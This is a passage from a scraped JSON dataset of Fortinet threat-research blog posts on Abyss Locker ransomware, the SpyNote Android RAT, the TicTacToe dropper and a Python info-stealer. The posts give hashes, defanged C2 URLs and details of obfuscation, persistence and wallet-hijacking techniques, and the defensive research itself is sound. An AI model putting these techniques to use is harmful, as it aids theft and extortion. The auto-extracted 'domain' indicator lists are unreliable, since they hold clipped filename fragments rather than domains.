sqlwriter.exe supervise.exe synctime.exe tbirdconfig.exe tcpview.exe tcpview64.exe tcpview64a.exe tdsskiller.exe thunderbird.exe tomcat6.exe vsnapvss.exe wdswfsafe.exe winword.exe wordpad.exe wsa_service.exe wxServer.exe wxServerView.exe xfssvccon.exe The ransomware uses the following commands to delete Volume Shadow Copies: It runs the following commands to set the boot status policy: The Abyss Locker ransomware encrypts files on compromised machines and adds a “.abyss” extension to the encrypted files. The Abyss Locker version 1 variant for Windows adds a random five-letter extension instead of “.abyss.” The ransomware drops a ransom note labeled “WhatHappened.txt.” The TOR site used for ransom negotiations was not accessible at the time of our investigation. It then replaces the desktop wallpaper with its own, which contains a ransom message: However, the following file encryption exception applies to the Abyss Locker ransomware: It skips encrypting files with the following extensions: It also skips encrypting the following files: autorun.inf bootfont.bin bootsect.bak bootmgr.efi bootmgfw.efi desktop.ini iconcache.db ntuser.dat.log ! CryptoLockerDetectionDONT-DELETE!.jpg WhatHappened.txt In addition, it avoids encrypting files in the following folders: Windows.old $Windows.~bt $windows.~ws Microsoft – Cloud Apps & Gaming microsoft shared common files windows defender windowspowershell windows security windows journal windows photo viewer $Recycle. Bin Program Files Program Files (x86) system volume information Tor Browser Internet Explorer Opera Software Mozilla Firefox Our analysis of Abyss Locker ransomware version 2, which appeared in late January 2024, found no differences from version 1 in terms of functionality. The only differences we could find are the ransom message (including the message on the replaced wallpaper), which clearly states that it's version 2, and the TOR address used for ransom negotiation. The TOR site used by this version of Abyss Locker ransomware for ransom negotiation was still accessible at the time of our investigation. This ransomware variant runs the following run commands: The ransomware then encrypts files on the compromised machines and adds a “.crypt” extension to the encrypted files. It then creates files with a “. README_TO_RESTORE” extension, which is a ransom note. It avoids encrypting files in the following directories: /lost+found /usr/include /usr/libexec It also avoids encrypting files with the following extensions: . README_TO_RESTORE Currently, the Abyss Locker ransomware threat actor does not appear to have a TOR site that exposes the victim's name and allows others to view the stolen data, although BleepingComputer previouslyreportedsuch a leak site in mid-2023. However, the threat actor does offer a ransom negotiation site on TOR. The ransom is set low for businesses and high for consumers ($282,380 in this case), making it difficult to determine who is being targeted. The Abyss Locker ransomware described in this report are detected and blocked by FortiGuard Antivirus as: FortiGate, FortiMail, FortiClient, and FortiEDR support theFortiGuard AntiVirus service. The FortiGuard AntiVirus engine is a part of each of those solutions. As a result, customers who have these products with up-to-date protections are protected. Abyss Locker Ransomware File IOCs 72310e31280b7e90ebc9a32cb33674060a3587663c0334daef76c2ae2cc2a462 Abyss Locker v2 (Linux) 3fd080ef4cc5fbf8bf0e8736af00af973d5e41c105b4cd69522a0a3c34c96b6d Abyss Locker v2 (Windows) 9243bdcbe30fbd430a841a623e9e1bcc894e4fdc136d46e702a94dad4b10dfdc Abyss Locker v1 (Windows) 0763e887924f6c7afad58e7675ecfe34ab615f4bd8f569759b1c33f0b6d08c64 Abyss Locker v1 (Windows) dee2af08e1f5bb89e7bad79fae5c39c71ff089083d65da1c03c7a4c051fabae0 Abyss Locker v1 (Windows) e6537d30d66727c5a306dc291f02ceb9d2b48bffe89dd5eff7aa2d22e28b6d7c Abyss Locker v1 (Windows) 1d04d9a8eeed0e1371afed06dcc7300c7b8ca341fe2d4d777191a26dabac3596 Abyss Locker v1 (Windows) 1a31b8e23ccc7933c442d88523210c89cebd2c199d9ebb88b3d16eacbefe4120 Abyss Locker v1 (Windows) 25ce2fec4cd164a93dee5d00ab547ebe47a4b713cced567ab9aca4a7080afcb7 Abyss Locker v1 (Windows) b524773160f3cb3bfb96e7704ef31a986a179395d40a578edce8257862cafe5f Abyss Locker v1 (Windows) 362a16c5e86f13700bdf2d58f6c0ab26e289b6a5c10ad2769f3412ec0b2da711 Abyss Locker v1 (Windows) e5417c7a24aa6f952170e9dfcfdf044c2a7259a03a7683c3ddb72512ad0cd5c7 Abyss Locker v1 (Windows) 056220ff4204783d8cc8e596b3fc463a2e6b130db08ec923f17c9a78aa2032da Abyss Locker v1 (Windows) 877c8a1c391e21727b2cdb2f87c7b0b37fb7be1d8dd2d941f5c20b30eb65ee97 Abyss Locker v1 (Windows) 2e42b9ded573e97c095e45dad0bdd2a2d6a0a99e4f7242695054217e2bba6829 Abyss Locker v1 (Windows) Due to the ease of disruption, damage to daily operations, potential impact on an organization’s reputation, and the unwanted destruction or release of personally identifiable information (PII), etc., it is vital to keep all AV and IPS signatures up to date. Since the majority of ransomware is delivered via phishing, organizations should consider leveraging Fortinet solutions designed to train users to understand and detect phishing threats: TheFortiPhish Phishing Simulation Serviceuses real-world simulations to help organizations test user awareness and vigilance to phishing threats and to train and reinforce proper practices when users encounter targeted phishing attacks. Our FREEFortinet Certified Fundamentals (FCF)in Cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. Organizations will need to make foundational changes to the frequency, location, and security of their data backups to effectively deal with the evolving and rapidly expanding risk of ransomware. When coupled with digital supply chain compromise and a workforce telecommuting into the network, there is a real risk that attacks can come from anywhere. Cloud-based security solutions, such asSASE, to protect off-network devices; advanced endpoint security, such asEDR(endpoint detection and response) solutions that can disrupt malware mid-attack; andZero Trust Accessand network segmentation strategies that restrict access to applications and resources based on policy and context, should all be investigated to minimize risk and to reduce the impact of a successful ransomware attack. As part of the industry's leading fully integratedSecurity Fabric, delivering native synergy and automation across your security ecosystem, Fortinet also provides an extensive portfolio of technology and human-based as-a-service offerings. These services are powered by our global FortiGuard team of seasoned cybersecurity experts. FortiReconis a SaaS based Digital Risk Prevention Service backed by cybersecurity experts to provide unrivaled threat intelligence on the latest threat actor activity across the dark web, providing a rich understanding of threat actors’ motivations and TTPs. The service can detect evidence of attacks in progress allowing customers to rapidly respond to and shut down active threats. Organizations such as CISA, NCSC, theFBI, and HHS caution ransomware victims against paying a ransom partly because the payment does not guarantee that files will be recovered. According to aUS Department of Treasury's Office of Foreign Assets Control (OFAC) advisory, ransom payments may also embolden adversaries to target additional organizations, encourage other criminal actors to distribute ransomware, and/or fund illicit activities that could potentially be illegal. For organizations and individuals affected by ransomware, the FBI has a Ransomware Complaintpagewhere victims can submit samples of ransomware activity via their Internet Crimes Complaint Center (IC3). FortiGuard Labs’Emergency Incident Response Serviceprovides rapid and effective response when an incident is detected. OurIncident Readiness Subscription Serviceprovides tools and guidance to help you better prepare for a cyber incident through readiness assessments, IR playbook development, and IR playbook testing (tabletop exercises). Additionally,FortiRecon Digital Risk Protection (DRP)is a SaaS-based service that provides a view of what adversaries are seeing, doing, and planning to help you counter attacks at the reconnaissance phase and significantly reduce the risk, time, and cost of later-stage threat mitigation. Ransomware Roundup FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/ransomware-roundup-abyss-locker",
      "scraped_at": "2025-07-20T13:49:37.896200",
      "indicators": {
        "ip_address": [],
        "domain": [
          "accineSettings",
          "ootsect",
          "otepad",
          "ystemExplorerService64",
          "ysmon64",
          "xServerView",
          "otalcmd",
          "ystemExplorerService",
          "cpview",
          "hatHappened",
          "ulture",
          "trtscan",
          "BDBMgr",
          "mListen",
          "cwebbrowser",
          "qlservr",
          "bserver",
          "implyConnectionManager",
          "ydesktopqos",
          "umpcap",
          "beng50",
          "MBMSRV",
          "nfopath",
          "omcat6",
          "qlmangr",
          "birdconfig",
          "concache",
          "TVscan",
          "ystemExplorer",
          "ellSystemDetect",
          "vastUI",
          "rocessHacker",
          "otalcmd64",
          "dobeIPCBroker",
          "ccNTMon",
          "utoruns64a",
          "60doctor",
          "nputPersonalization",
          "ootfont",
          "EF",
          "gntsvc",
          "ordpad",
          "cpview64",
          "DExplorer",
          "efwatch",
          "ynctime",
          "mProxy",
          "sDtSrvr",
          "qlbrowser",
          "rCtrlCntr",
          "fssvccon",
          "ootmgr",
          "saccess",
          "xServer",
          "DExplorer64",
          "cpview64a",
          "owerpnt",
          "indows",
          "WCtlSrv",
          "sqlplussvc",
          "qlceip",
          "sDtsSrvr",
          "rocexp64",
          "inword",
          "rocexp",
          "nterpriseClient",
          "enetns",
          "upervise",
          "ystemTrayIcon",
          "eserver",
          "utorunsc64a",
          "loud",
          "tuser",
          "eamViewer",
          "dlauncher",
          "dobeCollabSync",
          "irefox",
          "sms",
          "BIDPService",
          "smdsrv",
          "bupdate",
          "sMpEng",
          "sftesql",
          "huDongFangYu",
          "utoruns",
          "ydesktopservice",
          "oreSync",
          "ervice",
          "cautoupds",
          "snapvss",
          "qlwriter",
          "dswfsafe",
          "dsskiller",
          "utorun",
          "ireShark",
          "utlook",
          "DExplorer64a",
          "utorunsc64",
          "qbcoreservice",
          "lassWire",
          "nenote",
          "accine",
          "rocmon64a",
          "xlbridge",
          "eeamDeploymentSvc",
          "eportingServicesService",
          "NENOTEM",
          "utoruns64",
          "agService",
          "utorunsc",
          "0gnjko1",
          "BDBMgrN",
          "bguard",
          "rocmon64",
          "rCcUxSys",
          "utodeskDesktopApp",
          "rocexp64a",
          "esktop",
          "ootmgfw",
          "NTAoSMgr",
          "ostgres",
          "engien",
          "accineElevatedCfg",
          "hunderbird"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "0763e887924f6c7afad58e7675ecfe34ab615f4bd8f569759b1c33f0b6d08c64",
          "e6537d30d66727c5a306dc291f02ceb9d2b48bffe89dd5eff7aa2d22e28b6d7c",
          "e5417c7a24aa6f952170e9dfcfdf044c2a7259a03a7683c3ddb72512ad0cd5c7",
          "dee2af08e1f5bb89e7bad79fae5c39c71ff089083d65da1c03c7a4c051fabae0",
          "1d04d9a8eeed0e1371afed06dcc7300c7b8ca341fe2d4d777191a26dabac3596",
          "877c8a1c391e21727b2cdb2f87c7b0b37fb7be1d8dd2d941f5c20b30eb65ee97",
          "72310e31280b7e90ebc9a32cb33674060a3587663c0334daef76c2ae2cc2a462",
          "362a16c5e86f13700bdf2d58f6c0ab26e289b6a5c10ad2769f3412ec0b2da711",
          "056220ff4204783d8cc8e596b3fc463a2e6b130db08ec923f17c9a78aa2032da",
          "1a31b8e23ccc7933c442d88523210c89cebd2c199d9ebb88b3d16eacbefe4120",
          "2e42b9ded573e97c095e45dad0bdd2a2d6a0a99e4f7242695054217e2bba6829",
          "b524773160f3cb3bfb96e7704ef31a986a179395d40a578edce8257862cafe5f",
          "9243bdcbe30fbd430a841a623e9e1bcc894e4fdc136d46e702a94dad4b10dfdc",
          "3fd080ef4cc5fbf8bf0e8736af00af973d5e41c105b4cd69522a0a3c34c96b6d",
          "25ce2fec4cd164a93dee5d00ab547ebe47a4b713cced567ab9aca4a7080afcb7"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 2.1309370988446728
    }
  },
  {
    "id": "Fortinet_35929",
    "source": "Fortinet",
    "title": "Android/SpyNote Moves to Crypto Currencies",
    "text": "FortiGuard Labs Threat Research Affected Platform:AndroidImpacted Users:Android users with mobile crypto wallet or banking applicationsImpact:Financial LossSeverity Level:Medium Spynoteis a Remote Access Trojan that initially surfaced in 2020. Since then, it has grown into one of the most common families of malware for Android, with multiple samples, integration of other RATs (e.g. CypherRat), and a large family of over 10,000 samples. There are multiple variants and integrations of other RATs, and since 2023 there has been agrowing interestinfinancial institutions. On February 1st, we found a malicious sample posing as a legitimate crypto wallet that actually included the SpyNote RAT with several interesting additions related to anti-analysis andcryptocurrencies. Like much Android malware today, this malware abuses theAccessibility API. This API is used to automatically perform UI actions. For example, the malicious sample uses the Accessibility API to record device unlocking gestures. Newer, this SpyNote sample uses the Accessibility API to target famous crypto wallets. The following code recognizes the use of a legitimatecrypto walletand displays anoverlayover it. The injected overlay consists of a WebView whose HTML is hard-coded in Base64. If we decode the overlay, we get anHTML page for cryptocurrency transfers. Notice that the page apparently initiates a transfer between 2 hard-coded fake wallets. See below: the “…” in between the alleged wallet addresses are exactly as in the code (note that we censored the full addresses). For the malware analyst, it’s obvious they are fake. However, it is likely the victim won’t notice because (1) the wallet identifiers always have many characters and are therefore difficult to verify, and (2) this will look as if it were displayed by the victim’s legit crypto wallet application (in reality, it is displayedoverthe real crypto wallet app, but this is not detectable). In addition, the malicious code uses the Accessibility API toautomatically fill a form and transfer a given amount of cryptocurrency to the cybercriminals. Precisely, the code performs the following tasks: All of these operations are performedautomaticallythrough the Accessibility APIwithout the user’s intervention. To gain access to the Accessibility API, all malware lure victims one way or another into giving them the necessary rights. This sample follows the same strategy. We remind end-users that they should never do this. While the Accessibility API is rightfully requested by apps to help people with disabilities, they should always be treated as highly suspicious coming from alleged crypto wallets, PDF Readers, Video Players, etc. The 2 screenshots below show (1) the SpyNote malware requesting Accessibility Service and (2) how, when you grant the desired access, the Android OS displays an additional warning window explaining the risks. It is still possible at that point to click on “Deny,” and the malware won’t gain access. Unfortunately, as soon as the victim clicks on “Allow,” it is basically “game over” because the malware can navigate, click, read, and modify any application. Besides injections into crypto wallets, the sample features an interesting, simple, but efficient anti-analysis technique. We remind users that Android Packages (APK) areZIPfiles and normally contain a Dalvik executable (classes.dex), a manifest (AndroidManifest.xml), resources, and assets. In this particular case, the sample ismalformatted: several resource files are meant to be present in the subdirectories of classes.dex and AndroidManifest.xml. But classes.dex and AndroidManifest.xml arefiles, notdirectories. Consequently, standard unzip tools fail with lots of errors, which complicates the automated analysis of the sample. After a growing interest in financial institutions,this new Android/SpyNote sample shows that malware authors are now taking into account cryptocurrencies. The capabilities of the malware are well beyond the mere spying of credentials as they can initiate cryptocurrency transfers. As for anti-analysis,while the implemented technique is simple and by-passable by a human analyst, it certainly defeats—or complicates—automated analysis, giving the malware author a little more time before detection. The sample is detected automatically by our products, and we urge Android users to pay particular attention to any application requesting the Accessibility API. Fortinet customers are already protected from this malware variant through our AntiVirus as follows: FortiGuard Labs detects the sample with the following AV signatures: Android/SpyNote. F!tr TheFortiGuard AntiVirus serviceis supported by FortiGate, FortiMail, FortiClient, and FortiEDR. Fortinet EPP customers running current AntiVirus updates are also protected. Imtoken.apk SHA1:8eea235b26fadeecd0f817433c97747853c51a24SHA256:caac4681389b0af7998ba8fd2062d18050a0e5e8cb4c8d0006a1b3a921ee52c8 Android/SpyNote. F!tr crypto,spyware FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/android-spynote-moves-to-crypto-currencies",
      "scraped_at": "2025-07-20T13:50:13.387415",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ndroidManifest",
          "lasses",
          "mtoken"
        ],
        "hash_md5": [],
        "hash_sha1": [],
        "hash_sha256": [
          "caac4681389b0af7998ba8fd2062d18050a0e5e8cb4c8d0006a1b3a921ee52c8"
        ],
        "cve": [],
        "email": [],
        "url": []
      },
      "threat_score": 0.292887029288703
    }
  },
  {
    "id": "Fortinet_63765",
    "source": "Fortinet",
    "title": "TicTacToe Dropper",
    "text": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft Windows UsersImpact:This loader has been used to load multiple RATs and info stealers, which can lead to compromised credentials and enable further malicious activitiesSeverity Level:Medium While analyzing malware samples collected from several victims, the FortiGuard team identified a grouping of malware droppers used to deliver various final-stage payloads throughout 2023. Malware droppers are malicious software designed to deliver and execute additional malware on a victim system and are employed to obfuscate final payloads during load and initial execution. Droppers within this group employ multiple stages of obfuscated payloads loading reflectively in memory. Some of the final stage payloads we identified include Leonem, AgentTesla, SnakeLogger, RemLoader, Sabsik, LokiBot, Taskun, Androm, Upatre, and Remcos. We have named this group of payloads ‘TicTacToe dropper’ due to a common Polish language string, ‘Kolko_i_krzyzyk,’ found in multiple earlier samples of the dropper, which translates to TicTacToe in English. While not all versions of this group of droppers contain this string, commonalities in their behavior led us to this grouping. We analyzed multiple samples of this dropper. The executable malware file was usually delivered through an .iso file. From cases directly observed in the wild, these iso files were delivered to the victim via phishing as an attachment (T1566.001). This technique of packing malware inside an iso file is typically employed to avoid detection by antivirus software and as a mark-of-the-web (MOTW) bypass technique (T1553.005). The executable inside the iso had multiple layers of DLL files, which were extracted at runtime and loaded directly into memory. One layer of DLL was decoded at runtime, and the next layer of DLL was loaded and decoded by the previous layer of the DLL file. We will discuss the extraction of these obfuscated payloads in a later section. The extraction process is convoluted, so the diagram below should be referenced alongside the analysis to better understand the behavior of the dropper. We found that the same dropper has been used to distribute multiple final-stage remote access tools (RATs) for at least the last 12 months. This is shown in the following timeline diagram: To better understand the TicTacToe dropper, we performed static and dynamic analysis on several samples. The first TicTacToe dropper sample analyzed is a 32-bit executable developed in the . NET programming language called ‘ALco.exe’ (SHA-1 b6914b8fa3d0b67eb6173123652b7f0682cd24fb). Analysis of the sample identified that, on execution, the dropper extracts and loads a . NET PE DLL file directly into its current process using a runtime assembly object. This means the file is loaded directly into memory without being written to disk. The code associated with this in-memory loading can be seen in Figure 3. We then extracted the DLL at runtime and saved it as a separate file. This extracted DLL file was named ‘Hadval.dll’ in the OriginalFileName field in the file's version information. In this article, we will call this file ‘Hadval.dll’ or ‘stage2 payload’ for reference. This Hadval.dll file is a 32-bit . NET PE DLL file. This DLL file was obfuscated with version 4.1 of the DeepSea software, which differs from what was used to obfuscate the main executable (as yet undetermined). The DeepSea obfuscation resulted in unreadable function names and clear indicators of code flow obfuscation, as shown in Figure 2. Thede4dot toolwas used to subvert some of the DeepSea obfuscation. The de4dot tool is an open source (GPLv3) . NET de-obfuscator and unpacker written in C# that can often be used to restore a packed and obfuscated assembly to almost the original assembly. The de4dot tool detected that the file was obfuscated using the tool DeepSea 4.1 and then de-obfuscated much of the library to provide a cleaner version of the Hadval.dll file. We can see the output of the de4dot tool execution in Figure 5 and some of the cleaner, more readable code in Figure 6. Performing further debugging of the ‘ALco.exe’ process, we identified that the Hadval.dll code is used to extract a gzip blob. Decompressed, this gzip blob revealed another 32-bit PE DLL file and another . NET library. This stage 3 payload has the internal file name ‘cruiser.dll.’ This cruiser.dll was protected by software calledSmartAssembly, which is software provided by Redgate to protect . NET code from reverse engineering. This software claims to protect the source code of . NET applications through obfuscation and encryption and is designed to prevent intellectual property theft through code analysis. The tool ‘Detect It Easy’ shows this information, as seen in Figure 7. This cruiser.dll file was de-obfuscated using the de4dot tool to create a cleaned version of the binary DLL file. Following this de-obfuscation, we can see that the cruiser.dll file has a class named ‘Munoz.’ This class contains a function that creates a copy of the executable in the temp folder. This payload matches the description of a payload with the same name, ‘cruiser.dll,’ as described in Jai Minton's blog, where he analyzed it. We can see the code from the cleaned cruiser.dll file in Figure 8, including the ‘Munoz’ class. The code from the stage 3 DLL file (cruiser.dll) extracts, reflectively loads, and executes the stage 4 payload from the bitmap object ‘dZAu’ (a resource from the main payload). The stage 4 payload is another . NET PE DLL file with the internal name 'Farinell2.dll.’ It is obfuscated with a custom obfuscator. This stage 4 payload (Farinell2.dll) then de-obfuscates, reflectively loads, and executes the final payload. We have seen multiple variants of this dropper with different types of final payloads (e.g., Lokibot to gain credentials from numerous browsers and software in the victim machine, Remcos for remote access, etc.) Analyzing another TicTacToe dropper allows us to document some common characteristics within the malware group. This executable (SHA1: 15b3c9768a67ce0d09807627f1939c7165a3fede) was also a 32-bit . NET executable with the internal name ‘IxOQ.exe.’ This executable was not obfuscated but shares similarities with the above variant, i.e., later-stage obfuscated payloads embedded as object resources. This can be seen in the screenshot in Figure 9. The resource object has stored hexadecimal numbers as strings. A simple obfuscation was used while storing, which was to replace ‘0’ (zero) with ‘ZZ’ and replace ‘F’ with ‘YY.’ When the object string was being loaded, this string replacement was reversed to get the original hexadecimal string. This string was then converted to bytes and loaded as assembly code using the ‘Assembly. Load’ method. The resource object contents can be seen in Figure 10. When this string was de-obfuscated and extracted, it was found to be a 32-bit . NET PE DLL file like the previous sample. This stage 2 payload had the internal name of ‘Pendulum.dll.’ When the code inside ‘Pendulum.dll’ is executed, it extracts a stage 3 payload named ‘cruiser.dll.’ This is the same file name as the stage 3 payload DLL of the previous sample and uses the same loading process. This cruiser.dll extracts the stage 4 payload from the bitmap object ‘JqZn,’ a resource in the primary executable ‘lxOQ.exe.’ This and the previous sample executable files present similarly obfuscated image objects. These bitmap objects are visually similar between samples, as shown in Figure 11, where this and the last sample are compared. The payload extracted from the bitmap object was found to be another 32-bit . NET PE DLL file. This DLL file has the internal name of ‘Discompard.dll’. The code from this payload was also loaded reflectively, as in previous stage payloads. Multiple antivirus engines recognized this final payload (Discompard.dll) as the ‘Zusy Banking Trojan’ or ‘Leonem’. This ‘Zusy Trojan’ isalso known as‘TinyBanker’ or ‘Tinba’ by some researchers. We performed an analysis of another separate TicTacToe dropper sample, which drops AgentTesla malware. This executable (SHA1: af14b44a1bdbf96b8fec28236f152d410c91e807) was also a 32-bit . NET executable and also employs an identical technique to load code stored in the resource element of the file. This can be seen in Figure 12. When the resource object was checked, it was very similar to the resource object in the previous sample. It had stored hexadecimal numbers as strings, and the code used to obfuscate it was also similar, replacing ‘0’ (zero) with ‘ZZ’ and substituting ‘F’ with ‘YY.’ This is shown in Figure 13. The stage 2 payload has the internal name ‘Pendulum.dll,’ and the stage 3 payload has the name ‘cruiser.dll.’ On execution, the stage 3 payload extracts the stage 4 payload from the bitmap object ‘faLa.’ Again, the visual aspects of this embedded bitmap object match those discussed in the previous two samples. This can be seen in Figure 14. The final payload in this sample was detected as AgentTesla, a well-known RAT. In our search for any reporting on this dropper, we identified amalware analysis reportfrom Jai Minton. The second malware sample we analyzed had the same names as the payload DLL files, also as mentioned in Jai Minton’s blog. The only slight change was that the stage 2 payload was ‘Pend.dll’ in his analyzed sample, and in the second sample analyzed above, it was ‘Pendulum.dll.’ Names of other intermediate payloads (Cruiser.dll and Discompard.dll) match the payloads analyzed in Jai’s blog. In addition to these naming similarities, the dropper behavior exhibited by the sample outlined in Jai’s analysis is identical and results in the loading and execution of a Remcos executable. We analyzed multiple common characteristics in the different TicTacToe dropper samples. Here are some common characteristics: This dropper delivers multiple types of final payloads. As a result, we do not believe a single threat actor group uses this dropper. Instead, it is used as a tool that may be sold as a service to threat actors. We discovered that samples distributed at the beginning of 2023 contained the strings TicTacToe (Kolko_i_krzyzyk). Later campaigns had different unique strings common across the same campaigns but distributed different final-stage payloads. Some of the strings include: ‘MatrixEqualityTestDetail,’ ‘QuanLyCafe,’ ‘Pizza_Project,’ ‘Kakurasu,’ ‘BanHang_1’, ‘ChiuMartSAIS,’ etc. This indicates that the dropper tool is in constant development, and developers are trying to evade the string-based analysis of their malware dropper. By understanding the operation of this dropper and implementing solutions that can prevent its execution, organizations will be able to prevent the execution of a variety of final-stage payloads before they can be loaded. Since each iteration of the dropper contains a different final payload, each would have a different hash. As a result, while hash-based detections are still effective at mitigating known campaigns that employ this loader, a behavior-based endpoint security tool is required to detect new campaigns due to the dynamic nature of this malware. Multistage payload extraction and in-memory execution behaviors exhibited by this dropper are anomalous compared to normal application execution, and this type of behavior should be detected and blocked by EDR technology such as FortiEDR. The behavior discussed in this article outlines the behavior of the dropper component of analyzed samples rather than the final payload. Additional samples related to previous known campaigns involving this dropper can be found in VirusTotal by searching for ‘fortinet:MSIL/Kryptik. AIJY!tr OR fortinet:MSIL/GenKryptik. GLXZ!tr OR fortinet:MSIL/GenKryptik. GCRZ!tr’ or by browsing the public collection here:https://www.virustotal.com/gui/collection/a5a5b60edcbbb203cb1965b1d544b74c47284e015ffd50312de0a251141bfbd7/iocs. As highlighted above, the loader described in this report is used to deploy a variety of final payloads. Each of these final payloads is typically tracked byFortiGuard Antivirusseparately, but all instances of this loader can be tracked through the following trackers: MSIL/Kryptik. AIJY!trMSIL/GenKryptik. GLXZ!trMSIL/GenKryptik. GCRZ!tr FortiEDRblocks the reflective loading behavior of this loader, preventing it from loading its final-stage payload. FortiEDR is also able to extract in-memory loaded artifacts to assist with triaging an infection by this dropper. We also suggest that organizations go through Fortinet’s freeFortinet Certified Fundamentals (FCF)in cybersecurity training. The training is designed to help end users learn about today's threat landscape and will introduce basic cybersecurity concepts and technology. If you believe this or any other cybersecurity threat has impacted your organization, please contact our GlobalFortiGuard Incident Response Team. Indicator Description Indicator Type First Observed Malicious Executable b6914b8fa3d0b67eb6173123652b7f0682cd24fb Dropper executable variant with final payload Lokibot Malicious Executable 90624ba95243c7ec20730a101cad6966e75df675 Dropper executable variant final payload Warzone RAT Malicious Executable 4a5b3465ef2298392b60ec78da233287185eb7dd Dropper executable variant with final payload Trojan Mamut Malicious Executable 15b3c9768a67ce0d09807627f1939c7165a3fede Dropper executable variant with final payload Taskun malware Malicious Executable af14b44a1bdbf96b8fec28236f152d410c91e807 Dropper executable variant with final payload AgentTesla malware Malicious Executable 69dfa8c16879ab1c6c3bb738619dabe9660f2376cb15051ce55e465680e4f67f SHA256 Hash Dropper executable variant with final payload Lokibot Malicious Executable 3af5c0843b016faa6129e40b696565d4117b48fd6750164ac4a0f307ef3d6a36 SHA256 Hash Dropper executable variant final payload Warzone RAT Malicious Executable 8fe52481cdabec8900f78cab1d673dbb1bde3366d9347a89c2ea8e2e74ab01b4 SHA256 Hash Dropper executable variant with final payload Trojan Mamut Malicious Executable 0239bc35516d6d3680c64f7a5a5a40801c7b0ea4db8a80718e4774687c565af3 SHA256 Hash Dropper executable variant with final payload Taskun malware Malicious Executable 349fada4859b8ffa4c690af723daa16669d6fa2b9f5ec51111adee2e8cb63748 SHA256 Hash Dropper executable variant with final payload AgentTesla malware http[:]//64.227.48[.]212/project/five/fre.php C2 contacted by final payload http[:]//171.22.30[.]147/tony/five/fre.php C2 contacted by final payload Info stealer FortiGuard Labs Threat Research FortiGuard Labs Threat Research FortiGuard Labs Threat Research Copyright © 2025 Fortinet, Inc. All Rights Reserved",
    "metadata": {
      "url": "https://www.fortinet.com/blog/threat-research/tictactoe-dropper",
      "scraped_at": "2025-07-20T13:50:20.429408",
      "indicators": {
        "ip_address": [],
        "domain": [
          "ww",
          "xOQ",
          "Lco",
          "endulum",
          "adval",
          "iscompard",
          "ruiser",
          "end",
          "arinell2",
          "re"
        ],
        "hash_md5": [],
        "hash_sha1": [
          "b6914b8fa3d0b67eb6173123652b7f0682cd24fb",
          "15b3c9768a67ce0d09807627f1939c7165a3fede",
          "af14b44a1bdbf96b8fec28236f152d410c91e807",
          "4a5b3465ef2298392b60ec78da233287185eb7dd",
          "90624ba95243c7ec20730a101cad6966e75df675"
        ],
        "hash_sha256": [
          "69dfa8c16879ab1c6c3bb738619dabe9660f2376cb15051ce55e465680e4f67f",
          "a5a5b60edcbbb203cb1965b1d544b74c47284e015ffd50312de0a251141bfbd7",
          "3af5c0843b016faa6129e40b696565d4117b48fd6750164ac4a0f307ef3d6a36",
          "349fada4859b8ffa4c690af723daa16669d6fa2b9f5ec51111adee2e8cb63748",
          "8fe52481cdabec8900f78cab1d673dbb1bde3366d9347a89c2ea8e2e74ab01b4",
          "0239bc35516d6d3680c64f7a5a5a40801c7b0ea4db8a80718e4774687c565af3"
        ],
        "cve": [],
        "email": [],
        "url": [
          "https://www.virustotal.com/gui/collection/a5a5b60edcbbb203cb1965b1d544b74c47284e015ffd50312de0a251141bfbd7/iocs."
        ]
      },
      "threat_score": 0.3385049365303245
    }
  },
  {
    "id": "Fortinet_10460",
    "source": "Fortinet",
    "title": "Python Info-stealer Distributed by Malicious Excel Document",
    "text": "FortiGuard Labs Threat Research Affected Platforms:Microsoft WindowsImpacted Users:Microsoft WindowsImpact:The stolen information can be used for future attackSeverity Level:High In January 2024, FortiGuard Labs obtained an Excel document distributing an info-stealer. From the fingerprints in this attack, it is related to a Vietnamese-based group that wasfirst reportedon in August 2023 andagainin September. The attack stages before the info-stealer are simple downloaders that increase the difficulty of detection. This article introduces each stage in this attack and provides a glimpse into the world behind the malware campaign. The first stage of this attack is an Excel document with a VBA script that executes a PowerShell command to download a Windows Update.bat from filebin.net. Figure 3 is a screenshot of the Windows Update.bat, protected by the Abobus obfuscator. Obfuscations such as variables whose names contain non-English characters and “^” escape characters are inserted into the original code. Additionally, variable expansions (%variable:~start,length% )were used to replace the alphabet in the original code. Figure 4 is the malicious part of the original code, which downloads and executes test.vbs in the next stage. Test.vbs is roughly the same as the middle stage of the campaign reported in August 2023. It downloads three files: Information stealer. Document.zip Python 3.11 with libraries for script.py. Executes script.py with the downloaded Python. Script.py is obfuscated by PyObfuscate, which means it needs extra modules to be executed properly. Document.zip is downloaded to solve this problem. In addition, test.vbs creates a value named “WinUpdater” within the registry key HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run to automatically run bypass.vbs when the victim logs in. Unlike the info-stealer described in the August 2023 report, script.py only collects browsers' cookies and login data. It extracts data from a wide range of browsers, from familiar browsers such as Chrome and Edge to browsers focused on the local market, like the Cốc Cốc browser. The collected data is compressed into a zip file, which will be sent to the attacker’s telegram bot with a message containing the date, victim’s country, IP address, language, password count, and cookie count. Furthermore, a watermark in the message sent to the bot links to a telegram channel that provides hacking tools and sensitive information. Though it is not directly relevant to this campaign group, it still gives a fresh example of how stolen information is spread. As we mentioned, many stages of this attack are downloaded from an open platform. This gives us a chance to gather more information about this hacker group. Apart from the files in the infection vectors, files sharing several commonalities with this campaign were also uploaded. For example, obfuscated batch files and VBScript files executing PowerShell code whose code is identical to Windows Update.bat and test.vbs. From those downloaders, we found more repositories related to this hacker group. In addition, there is malware probably used in other campaigns loaded on the repositories, including XWorm, VenomRat, RedLine, etc. We also found clues to another campaign from the telegram bot that receives the victim’s information. As Figure 10 shows, the threat actor cheated the victim into enabling macros in a Word document named “done 300coki.docm.” Though we couldn’t obtain the file named in Figure 10, the file name dropped a hint that they used cookies as a lure. Moreover, we found another Word document containing Facebook cookies and a malicious macro in the chat history. Like the Excel document we mentioned previously, the macro downloads an obfuscated batch file, which downloads the next stage 